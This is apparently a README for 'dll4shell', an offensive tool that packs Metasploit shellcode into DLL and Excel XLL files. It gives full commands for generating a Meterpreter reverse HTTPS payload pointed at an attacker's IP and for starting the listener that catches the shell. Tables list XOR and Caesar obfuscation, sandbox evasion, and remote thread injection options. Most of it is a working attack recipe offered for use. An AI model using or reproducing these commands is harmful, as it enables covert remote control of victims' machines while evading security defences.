### C++ shellcode launcher

A collection of DLL wrappers around various shellcode injection and obfuscation techniques. Based on the [charlotte](https://github.com/9emin1/charlotte) tool.

### Execution steps
```
git clone https://github.com/cepxeo/dll4shell && cd dll4shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 EXITFUNC=thread -f raw -e x64/xor_dynamic -a x64 -o beacon.bin

sudo apt install mingw-w64

python dll4shell.py -e xor -o dll

sudo msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST YOUR_IP; set LPORT 8443; exploit"
```

Techniques used (`-e` parameter):

|Value           |Obfuscation method, Details    |Injection type               |Code invocation              |
|----------------|-------------------------------|-----------------------------|-----------------------------|
|xor             |XOR                            |Local | VirtualAlloc, CreateThread   |
|xor1            |XOR, sandbox evasion           |Remote | VirtualAllocEx, CreateRemoteThread|
|xor2            |XOR, sandbox evasion           |Local  | hHeapAlloc, hCreateThread    |
|shift           |Cezar                          |Local  | VirtualAlloc, CreateThread   |
|shift1          |Cezar, sandbox evasion         |Remote  | VirtualAllocEx, CreateRemoteThread   |

Outputs (`-o` parameter):

|Value          |Details                        |
|---------------|-------------------------------|
|dll            |DLL callable via rundll32|
|xll            |XLL callable via Add-Ins|
|payload        |save encrypted payload only|
